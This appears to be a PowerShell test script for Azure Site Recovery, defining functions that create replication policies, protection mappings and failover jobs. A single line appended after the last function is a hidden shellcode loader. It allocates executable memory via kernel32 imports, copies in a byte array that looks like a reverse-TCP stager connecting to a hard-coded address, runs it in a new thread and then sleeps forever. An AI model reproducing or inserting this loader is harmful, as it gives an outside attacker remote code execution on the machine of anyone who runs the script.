















$suffix="v2avm1"
$JobQueryWaitTimeInSeconds = 0
$PrimaryFabricName = "V2A-W2K12-400"
$PrimaryNetworkFriendlyName = "corp"
$RecoveryNetworkFriendlyName = "corp"
$NetworkMappingName = "corp96map"
$RecoveryPlanName = "RPSwag96" + $suffix
$policyName1 = "V2aTest" + $suffix
$policyName2 = "V2aTest"+ $suffix+"-failback"
$PrimaryProtectionContainerMapping = "pcmmapping" + $suffix
$reverseMapping = "reverseMap" + $suffix
$pcName = "V2A-W2K12-400"

$rpiName = "V2ATest-rpi-" + $suffix
$RecoveryAzureStorageAccountId = "/subscriptions/7c943c1b-5122-4097-90c8-861411bdd574/resourceGroups/canaryexproute/providers/Microsoft.Storage/storageAccounts/ev2teststorage" 
$RecoveryResourceGroupId  = "/subscriptions/7c943c1b-5122-4097-90c8-861411bdd574/resourceGroups/canaryexproute" 
$AzureVmNetworkId = "/subscriptions/7c943c1b-5122-4097-90c8-861411bdd574/resourceGroups/ERNetwork/providers/Microsoft.Network/virtualNetworks/ASRCanaryTestSub3-CORP-SEA-VNET-1"
$rpiNameNew = "V2ATest-CentOS6U7-400-new"
$vCenterIpOrHostName = "10.150.209.216"
$vCenterName = "BCDR"
$Subnet = "Subnet-1"

$piName = "v2avm1"
$vmIp = "10.150.208.125"
$VmNameList = "v2avm1,win-4002,win-4003"


function WaitForJobCompletion
{ 
    param(
        [string] $JobId,
        [int] $JobQueryWaitTimeInSeconds =$JobQueryWaitTimeInSeconds
        )
        $isJobLeftForProcessing = $true;
        do
        {
            $Job = Get-AzRecoveryServicesAsrJob -Name $JobId
            $Job

            if($Job.State -eq "InProgress" -or $Job.State -eq "NotStarted")
            {
                $isJobLeftForProcessing = $true
            }
            else
            {
                $isJobLeftForProcessing = $false
            }

            if($isJobLeftForProcessing)
            {
                [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait($JobQueryWaitTimeInSeconds * 1000)
            }
        }While($isJobLeftForProcessing)
}


Function WaitForIRCompletion
{ 
    param(
        [PSObject] $TargetObjectId,
        [int] $JobQueryWaitTimeInSeconds = $JobQueryWaitTimeInSeconds
        )
        $isProcessingLeft = $true
        $IRjobs = $null

        do
        {
            $IRjobs = Get-AzRecoveryServicesAsrJob -TargetObjectId $TargetObjectId | Sort-Object StartTime -Descending | select -First 1 | Where-Object{$_.JobType -eq "IrCompletion"}
            if($IRjobs -eq $null -or $IRjobs.Count -lt 1)
            {
                $isProcessingLeft = $true
            }
            else
            {
                $isProcessingLeft = $false
            }

            if($isProcessingLeft)
            {
                [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait($JobQueryWaitTimeInSeconds * 1000)
            }
        }While($isProcessingLeft)

        $IRjobs
        WaitForJobCompletion -JobId $IRjobs[0].Name -JobQueryWaitTimeInSeconds $JobQueryWaitTimeInSeconds
}


function Test-vCenter 
{
    param([string] $vaultSettingsFilePath)

    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath
    $fabric =  Get-AsrFabric -FriendlyName $PrimaryFabricName
    $job = New-ASRvCenter -Fabric $fabric -Name $vCenterName -IpOrHostName $vCenterIporHostName -Port 443 -Account $fabric.FabricSpecificDetails.RunAsAccounts[0]
    WaitForJobCompletion -JobId $job.name

    $fabric =  Get-AsrFabric -FriendlyName $PrimaryFabricName

    $vCenterList = Get-ASRvCenter -Fabric $fabric 
    Assert-NotNull($vCenterList[0])

    $vCenter = Get-ASRvCenter -Fabric $fabric -Name $vCenterName
    Assert-NotNull($vCenter)

    $updateJob = Update-AzRecoveryServicesAsrvCenter -InputObject $vCenter -Port 444
    WaitForJobCompletion -JobId $updatejob.name

    $job = Remove-ASRvCenter -InputObject $vCenter
    WaitForJobCompletion -JobId $job.name
}


function Test-SiteRecoveryFabricTest
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath
    
    $fabricList =  Get-AsrFabric
    Assert-NotNull($fabricList)

    $fabric =  Get-AsrFabric -FriendlyName $PrimaryFabricName
    Assert-NotNull($fabric)
    Assert-NotNull($fabric.FriendlyName)
    Assert-NotNull($fabric.name)
    Assert-NotNull($fabric.ID)
    Assert-NotNull($fabric.FabricSpecificDetails)

    $fabricDetails = $fabric.FabricSpecificDetails

    Assert-NotNull($fabricDetails.HostName)
    Assert-NotNull($fabricDetails.IpAddress)
    Assert-NotNull($fabricDetails.AgentVersion)
    Assert-NotNull($fabricDetails.ProtectedServers)
    Assert-NotNull($fabricDetails.LastHeartbeat)
    Assert-NotNull($fabricDetails.ProcessServers)
    Assert-NotNull($fabricDetails.MasterTargetServers)
    Assert-NotNull($fabricDetails.RunAsAccounts)
    Assert-NotNull($fabricDetails.IpAddress)

    $ProcessServer = $fabricDetails.ProcessServers

    Assert-NotNull($ProcessServer.FriendlyName)
    Assert-NotNull($ProcessServer.Id)
    Assert-NotNull($ProcessServer.IpAddress)

    
    
}


function Test-PC
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath
    $fabric =  Get-AsrFabric -FriendlyName $PrimaryFabricName
    

    $ProtectionContainerList =  Get-ASRProtectionContainer -Fabric $fabric
    Assert-NotNull($ProtectionContainerList)
    $ProtectionContainer = $ProtectionContainerList[0]
    Assert-NotNull($ProtectionContainer)
    Assert-NotNull($ProtectionContainer.id)
    Assert-AreEQUAL -actual $ProtectionContainer.FabricType -expected "VMware"

    $ProtectionContainer =  Get-ASRProtectionContainer -FriendlyName $pcName -Fabric $fabric
    Assert-NotNull($ProtectionContainer)
    Assert-NotNull($ProtectionContainer.id)
    Assert-AreEQUAL -actual $ProtectionContainer.FabricType -expected "VMware"

    $ProtectionContainer =  Get-ASRProtectionContainer -Name $ProtectionContainer.Name -Fabric $fabric
        Assert-NotNull($ProtectionContainer)
    Assert-NotNull($ProtectionContainer.id)
    Assert-AreEQUAL -actual $ProtectionContainer.FabricType -expected "VMware"
}


function Test-SiteRecoveryPolicy
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    $Job = New-AzRecoveryServicesAsrPolicy -Name $policyName1 -VmwareToAzure -RecoveryPointRetentionInHours 40  -RPOWarningThresholdInMinutes 5 -ApplicationConsistentSnapshotFrequencyInHours 15
    WaitForJobCompletion -JobId $Job.Name
    
    $Policy1 = Get-AzRecoveryServicesAsrPolicy -Name $PolicyName1
    Assert-True { $Policy1.Count -gt 0 }
    Assert-NotNull($Policy1)

    
    $Job = New-AzRecoveryServicesAsrPolicy -Name $policyName2 -AzureToVmware -RecoveryPointRetentionInHours 40  -RPOWarningThresholdInMinutes 5 -ApplicationConsistentSnapshotFrequencyInHours 15
    WaitForJobCompletion -JobId $Job.Name

    
    $Policy2 = Get-AzRecoveryServicesAsrPolicy -Name $PolicyName2
    Assert-True { $Policy2.Count -gt 0 }
    Assert-NotNull($Policy2)
    
    $RemoveJob = Remove-ASRPolicy -InputObject $Policy1
    $RemoveJob = Remove-ASRPolicy -InputObject $Policy2
}


function Test-V2AAddPI
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath
    $fabric =  Get-AsrFabric -FriendlyName $PrimaryFabricName
     $pc =  Get-ASRProtectionContainer -FriendlyName $pcName -Fabric $fabric
    $job = New-AzRecoveryServicesAsrProtectableItem -IPAddress $vmIp -FriendlyName $piName -OSType Windows -ProtectionContainer $pc
    waitForJobCompletion -JobId $job.name
}


function Test-PCM 
{
    param([string] $vaultSettingsFilePath)

    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath
    $fabric =  Get-AsrFabric -FriendlyName $PrimaryFabricName
    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    $pc =  Get-ASRProtectionContainer -FriendlyName $pcName -Fabric $fabric
    
    $Job1 = New-AzRecoveryServicesAsrPolicy -Name $policyName1 -VmwaretoAzure -RecoveryPointRetentionInHours 40  -RPOWarningThresholdInMinutes 5 -ApplicationConsistentSnapshotFrequencyInHours 15
    $Job2 = New-AzRecoveryServicesAsrPolicy -Name $policyName2 -AzureToVmware -RecoveryPointRetentionInHours 40  -RPOWarningThresholdInMinutes 5 -ApplicationConsistentSnapshotFrequencyInHours 15
    waitForJobCompletion -JobId $job1.name
    waitForJobCompletion -JobId $job2.name

    $Policy1 = Get-AzRecoveryServicesAsrPolicy -Name $PolicyName1
    $Policy2 = Get-AzRecoveryServicesAsrPolicy -Name $PolicyName2

    
    $pcmjob =  New-AzRecoveryServicesAsrProtectionContainerMapping -Name $PrimaryProtectionContainerMapping -policy $Policy1 -PrimaryProtectionContainer $pc
    WaitForJobCompletion -JobId $pcmjob.Name 

    $pcm = Get-ASRProtectionContainerMapping -Name $PrimaryProtectionContainerMapping -ProtectionContainer $pc
    Assert-NotNull($pcm)

    $Removepcm = Remove-AzRecoveryServicesAsrProtectionContainerMapping  -InputObject $pcm 
    WaitForJobCompletion -JobId $Removepcm.Name
}


function V2ACreateRPI 
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    $fabric =  Get-AsrFabric -FriendlyName $PrimaryFabricName
    $pc =  Get-ASRProtectionContainer -FriendlyName $pcName -Fabric $fabric
    $Job1 = New-AzRecoveryServicesAsrPolicy -VmwareToAzure -Name $policyName1  -RecoveryPointRetentionInHours 40  -RPOWarningThresholdInMinutes 5 -ApplicationConsistentSnapshotFrequencyInHours 15 -MultiVmSyncStatus "Enable"
    $Job2 = New-AzRecoveryServicesAsrPolicy -AzureToVmware -Name $policyName2  -RecoveryPointRetentionInHours 40  -RPOWarningThresholdInMinutes 5 -ApplicationConsistentSnapshotFrequencyInHours 15 -MultiVmSyncStatus "Enable"
    WaitForJobCompletion -JobId $Job1.Name
    WaitForJobCompletion -JobId $Job2.Name
    $Policy1 = Get-AzRecoveryServicesAsrPolicy -Name $PolicyName1
    $Policy2 = Get-AzRecoveryServicesAsrPolicy -Name $PolicyName2

    
    $pcmjob =  New-AzRecoveryServicesAsrProtectionContainerMapping -Name $PrimaryProtectionContainerMapping -policy $Policy1 -PrimaryProtectionContainer $pc
    WaitForJobCompletion -JobId $pcmjob.Name

    $pcm = Get-ASRProtectionContainerMapping -Name $PrimaryProtectionContainerMapping -ProtectionContainer $pc
    $pi = Get-ASRProtectableItem -ProtectionContainer $pc -FriendlyName $piName
    $EnableDRjob = New-AzRecoveryServicesAsrReplicationProtectedItem -vmwaretoazure -ProtectableItem $pi -Name $rpiName -ProtectionContainerMapping $pcm -RecoveryAzureStorageAccountId $RecoveryAzureStorageAccountId -RecoveryResourceGroupId  $RecoveryResourceGroupId -ProcessServer $fabric.fabricSpecificDetails.ProcessServers[0] -Account $fabric.fabricSpecificDetails.RunAsAccounts[0] -RecoveryAzureNetworkId $AzureVmNetworkId -RecoveryAzureSubnetName $Subnet
    }



function Test-RPJobReverse
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath
    $fabric =  Get-AsrFabric -FriendlyName $PrimaryFabricName
    $pc =  Get-ASRProtectionContainer -FriendlyName $pcName -Fabric $fabric
    $rpi = get-AzRecoveryServicesAsrReplicationProtectedItem -ProtectionContainer $pc -Name $rpiName
    $Policy2 = Get-AzRecoveryServicesAsrPolicy -Name $PolicyName2
    $pcmjob =  New-AzRecoveryServicesAsrProtectionContainerMapping -Name $reverseMapping -policy $Policy2 -PrimaryProtectionContainer $pc -RecoveryProtectionContainer $pc
    WaitForJobCompletion -JobId $pcmjob.Name
    
    $pcm = Get-ASRProtectionContainerMapping -Name $reverseMapping -ProtectionContainer $pc
    $job = Update-AzRecoveryServicesAsrProtectionDirection -AzureToVMware`
    -Account $fabric.FabricSpecificDetails.RunAsAccounts[0] -DataStore $fabric.FabricSpecificDetails.MasterTargetServers[0].DataStores[3] `
    -Direction RecoveryToPrimary -MasterTarget $fabric.FabricSpecificDetails.MasterTargetServers[0] `
    -ProcessServer $fabric.FabricSpecificDetails.ProcessServers[0] -ProtectionContainerMapping $pcm `
    -ReplicationProtectedItem $RPI -RetentionVolume $fabric.FabricSpecificDetails.MasterTargetServers[0].RetentionVolumes[0] 
    WaitForJobCompletion -JobId $Job.Name
    
    $RP = Get-AzRecoveryServicesAsrRecoveryPlan -Name $RecoveryPlanName 

    
    
    
    
    
    $foJob = Start-AzRecoveryServicesAsrUnPlannedFailoverJob -RecoveryPlan $RP -Direction RecoveryToPrimary
    WaitForJobCompletion -JobId $foJob.Name
    $commitJob = Start-AzRecoveryServicesAsrCommitFailoverJob -RecoveryPlan $RP 
    WaitForJobCompletion -JobId $commitJob.Name
}


function V2ATestResync 
{
    param([string] $vaultSettingsFilePath)
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    $fabric =  Get-AsrFabric -FriendlyName $PrimaryFabricName
    $pc =  Get-ASRProtectionContainer -FriendlyName $pcName -Fabric $fabric
    $rpi = get-AzRecoveryServicesAsrReplicationProtectedItem -ProtectionContainer $pc -Name $rpiName
    $job = Start-AzRecoveryServicesAsrResynchronizeReplicationJob -ReplicationProtectedItem $rpi
    WaitForJobCompletion -JobId $Job.Name
}


function V2AUpdateMobilityService
{
    param([string] $vaultSettingsFilePath)
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath
    $fabric =  Get-AsrFabric -FriendlyName $PrimaryFabricName
    $pc =  Get-ASRProtectionContainer -FriendlyName $pcName -Fabric $fabric
    $rpi = get-AzRecoveryServicesAsrReplicationProtectedItem -ProtectionContainer $pc -Name $rpiName
    $job = Update-AzRecoveryServicesAsrMobilityService -ReplicationProtectedItem $rpi -Account $fabric.fabricSpecificDetails.RunAsAccounts[0]
    WaitForJobCompletion -JobId $Job.Name
}


function V2AUpdateServiceProvider 
{
    param([string] $vaultSettingsFilePath)
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath
    $fabric =  Get-AsrFabric -FriendlyName $PrimaryFabricName
    $splist = Get-ASRServicesProvider -Fabric $fabric 
    $job = Update-ASRServicesProvider -InputObject $splist[0]
    WaitForJobCompletion -JobId $Job.Name
}


function V2ASwitchProcessServer 
{
    param([string] $vaultSettingsFilePath)
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath
    $fabric =  Get-AsrFabric -FriendlyName $PrimaryFabricName
    $pc =  Get-ASRProtectionContainer -FriendlyName $pcName -Fabric $fabric
    $RPIList = Get-AzRecoveryServicesAsrReplicationProtectedItem   -ProtectionContainer $pc
    $job = Start-AzRecoveryServicesAsrSwitchProcessServerJob -Fabric $fabric -SourceProcessServer $fabric.FabricSpecificDetails.ProcessServers[0] -TargetProcessServer $fabric.FabricSpecificDetails.ProcessServers[1] -ReplicatedItem $RPIList
    WaitForJobCompletion -JobId $Job.Name
    $job = Start-AzRecoveryServicesAsrSwitchProcessServerJob -Fabric $fabric -SourceProcessServer $fabric.FabricSpecificDetails.ProcessServers[0] -TargetProcessServer $fabric.FabricSpecificDetails.ProcessServers[1]
    WaitForJobCompletion -JobId $Job.Name
}



function V2ATestFailoverJob 
{
    param([string] $vaultSettingsFilePath)

    
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

    $fabric =  Get-AsrFabric -FriendlyName $PrimaryFabricName
    $pc =  Get-ASRProtectionContainer -FriendlyName $pcName -Fabric $fabric
    
    $rpi = get-AzRecoveryServicesAsrReplicationProtectedItem -ProtectionContainer $pc -Name $rpiName
    
    do
    {
        $rPoints = Get-ASRRecoveryPoint -ReplicationProtectedItem $rpi
        if($rpoints -and  $rpoints.count  -eq 0) {		
			
		}		
		else
		{
			break
		}
    }while ($rpoints.count -lt 0)

    $tfoJob = Start-AzRecoveryServicesAsrTestFailoverJob -ReplicationProtectedItem $rpi -Direction PrimaryToRecovery -AzureVMNetworkId  $AzureVMNetworkId -RecoveryPoint $rpoints[0]

    WaitForJobCompletion -JobId $tfoJob.Name

    $cleanupJob = Start-AzRecoveryServicesAsrTestFailoverCleanupJob -ReplicationProtectedItem $rpi -Comment "testing done"
    WaitForJobCompletion -JobId $cleanupJob.Name
    }

    function V2AFailoverJob 
    {
        param([string] $vaultSettingsFilePath)

        
        Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath

        $fabric =  Get-AsrFabric -Name "9a72155b61d09325a02ba0311dea55df3a7135b65558b43c9ff540b9e7be084f"
        $pcName = "cloud_a5441e09-275c-4f15-a1b9-450a22c89d7b"
        $pc =  Get-ASRProtectionContainer -Name $pcName -Fabric $fabric
        $rpiName = "win-4003"
        $rpi = get-AzRecoveryServicesAsrReplicationProtectedItem -ProtectionContainer $pc -FriendlyName $rpiName
    
        $foJob = Start-AzRecoveryServicesAsrUnPlannedFailoverJob -ReplicationProtectedItem $rpi -Direction PrimaryToRecovery
        WaitForJobCompletion -JobId $foJob.Name
        $commitJob = Start-AzRecoveryServicesAsrCommitFailoverJob -ReplicationProtectedItem $rpi 
        WaitForJobCompletion -JobId $commitJob.Name
    }


function V2ATestReprotect 
{
    param([string] $vaultSettingsFilePath)
    Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath
    $fabric =  Get-AsrFabric -Name "9a72155b61d09325a02ba0311dea55df3a7135b65558b43c9ff540b9e7be084f"
        $pcName = "cloud_a5441e09-275c-4f15-a1b9-450a22c89d7b"
        $pc =  Get-ASRProtectionContainer -Name $pcName -Fabric $fabric
        $rpiName = "win-4003"
        $rpi = get-AzRecoveryServicesAsrReplicationProtectedItem -ProtectionContainer $pc -FriendlyName $rpiName
    
    $Policy2 = Get-AzRecoveryServicesAsrPolicy -Name $PolicyName2
    $pcmjob =  New-AzRecoveryServicesAsrProtectionContainerMapping -Name $reverseMapping -policy $Policy2 -PrimaryProtectionContainer $pc -RecoveryProtectionContainer $pc
    WaitForJobCompletion -JobId $pcmjob.Name

    $pcm = Get-ASRProtectionContainerMapping -Name $reverseMapping -ProtectionContainer $pc
    $job = Update-AzRecoveryServicesAsrProtectionDirection `
                -AzureToVmware `
                -Account $fabric.FabricSpecificDetails.RunAsAccounts[0] `
                -DataStore $fabric.FabricSpecificDetails.MasterTargetServers[1].DataStores[3]  `
                -Direction RecoveryToPrimary -MasterTarget $fabric.FabricSpecificDetails.MasterTargetServers[1] `
                -ProcessServer $fabric.FabricSpecificDetails.ProcessServers[1] `
                -ProtectionContainerMapping $pcm `
                -ReplicationProtectedItem $RPI `
                -RetentionVolume $fabric.FabricSpecificDetails.MasterTargetServers[1].RetentionVolumes[0]
    
    }

function v2aFailbackReprotect
{
    param([string] $vaultSettingsFilePath)
        Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath
        $fabric =  Get-AsrFabric -Name "9a72155b61d09325a02ba0311dea55df3a7135b65558b43c9ff540b9e7be084f"
        $pcName = "cloud_a5441e09-275c-4f15-a1b9-450a22c89d7b"
        $pc =  Get-ASRProtectionContainer -Name $pcName -Fabric $fabric
        $rpiName = "win-4002"
    
        $rpi = get-AzRecoveryServicesAsrReplicationProtectedItem -ProtectionContainer $pc -FriendlyName $rpiName
        $job = Start-AzRecoveryServicesAsrUnPlannedFailoverJob -ReplicationProtectedItem $rpi -Direction PrimaryToRecovery
        WaitForJobCompletion -JobId $Job.Name

        $job = Start-AzRecoveryServicesAsrCommitFailoverJob -ReplicationProtectedItem $rpi 
        WaitForJobCompletion -JobId $Job.Name

        $pcm = Get-ASRProtectionContainerMapping -Name $PrimaryProtectionContainerMapping -ProtectionContainer $pc

        $job = Update-AzRecoveryServicesAsrProtectionDirection `
                    -VMwareToAzure`
                    -Account $fabric.FabricSpecificDetails.RunAsAccounts[1]`
                    -Direction RecoveryToPrimary`
                    -ProcessServer $fabric.FabricSpecificDetails.ProcessServers[1]`
                    -ProtectionContainerMapping $pcm `
                    -ReplicationProtectedItem $rpi
}

function v2aUpdatePolicy
{
    param([string] $vaultSettingsFilePath)
        Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath
        $po = get-asrpolicy -Name V2aTestPolicy2
        Update-AzRecoveryServicesAsrPolicy  -VMwareToAzure -ApplicationConsistentSnapshotFrequencyInHours 5 -InputObject $po -MultiVmSyncStatus "Enable"
        Update-AzRecoveryServicesAsrPolicy  -VMwareToAzure -ApplicationConsistentSnapshotFrequencyInHours 5 -InputObject $po
}

function Test-SetRPI
{
    param([string] $vaultSettingsFilePath)
        Import-AzRecoveryServicesAsrVaultSettingsFile -Path $vaultSettingsFilePath
        $fabric =  Get-AsrFabric -FriendlyName $PrimaryFabricName
        $pc =  Get-ASRProtectionContainer -FriendlyName $pcName -Fabric $fabric
        $rpi = get-AzRecoveryServicesAsrReplicationProtectedItem -ProtectionContainer $pc -Name "-RPI"
        Set-AzRecoveryServicesAsrReplicationProtectedItem -InputObject $rpi -Name "VSPS212" -PrimaryNic $rpi.nicDetailsList[0].nicId -RecoveryNetworkId `
                        $AzureVmNetworkId -RecoveryNicStaticIPAddress "10.151.128.205" -RecoveryNicSubnetName "Subnet-2" -UseManagedDisk "True"
    
}


$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x55,0x6a,0xd7,0x09,0x68,0x02,0x00,0x1a,0x0a,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

